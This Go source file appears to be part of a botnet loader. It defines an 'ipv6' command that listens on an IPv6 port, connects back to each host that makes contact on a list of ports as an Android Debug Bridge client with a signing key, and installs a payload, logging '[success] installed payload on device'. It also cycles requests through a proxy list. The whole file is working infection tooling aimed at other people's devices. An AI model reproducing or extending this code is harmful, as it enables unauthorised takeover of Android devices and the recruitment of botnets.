package main

import (
	adb "android/internal/adb"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

var (
	ipv6PortListener string
)

var ipv6Cmd = &cobra.Command{
	Use:   "ipv6",
	Short: "Start IPv6 loader",
	Run:   runIPv6,
}

func init() {
	rootCmd.AddCommand(ipv6Cmd)

	ipv6Cmd.Flags().StringVarP(&ipv6PortListener, "listener", "l", ":80", "Port to listen on (e.g. :80)")
	ipv6Cmd.Flags().StringVarP(&proxyInputFile, "input", "i", proxyInputFile, "Input proxy file to use")
}

func runIPv6(cmd *cobra.Command, args []string) {
	loadProxyFile()

	if err := loadSigner("auth.key"); err != nil {
		log.Println("Reading key failed, make sure there is a auth.key")
		return
	}

	go func() {
		listener, err := net.Listen("tcp6", ipv6PortListener)
		if err != nil {
			log.Fatalf("Failed to listen on %s: %v", ipv6PortListener, err)
		}

		log.Printf("Listening on %s", ipv6PortListener)

		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Println("Accept error:", err)
				continue
			}

			go handleIPv6Connection(conn)
		}
	}()

	for i := 0; i < globalThreads; i++ {
		go func() {
			for {
				doIPv6Request(proxies.Next())
				time.Sleep(1 * time.Second)
			}
		}()
	}

	select {}
}

func handleIPv6Connection(x net.Conn) {
	defer x.Close()

	// split properly
	host, _, err := net.SplitHostPort(x.RemoteAddr().String())
	if err != nil {
		return
	}

	// block non v6
	if len(net.ParseIP(host)) != net.IPv6len {
		// log.Println("[info] not a v6 host", host)
		return
	}

	// try to connect back
	for _, port := range globalPorts {
		conn, err := net.DialTimeout("tcp6", net.JoinHostPort(host, strconv.Itoa(port)), 5*time.Second)
		if err != nil {
			continue
		}

		client := adb.NewClient(conn)
		client.SetSigner(rsaSigner)

		name, model, err := client.Handshake()
		if err != nil {
			_ = conn.Close()
			continue
		}

		if err := handlePayload(client); err == nil {
			fmt.Printf("[success] installed payload on device '%s' (%s, [%s]:%d)\n", name, model, host, port)
		}

		_ = client.Close()
		break
	}
}

func doIPv6Request(prx string) {
	proxerSplit := strings.Split(strings.ReplaceAll(prx, "<$random>", String(12)), "|")
	if len(proxerSplit) < 2 {
		return
	}

	addr := proxerSplit[1]
	proxyHost, auth := parseProxy(proxerSplit[0])

	dialer, err := getDialer(proxyHost, auth)
	if err != nil {
		return
	}

	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s%s", addr, ipv6PortListener))
	if err != nil {
		return
	}

	time.Sleep(1 * time.Second)
	_ = conn.Close()
}
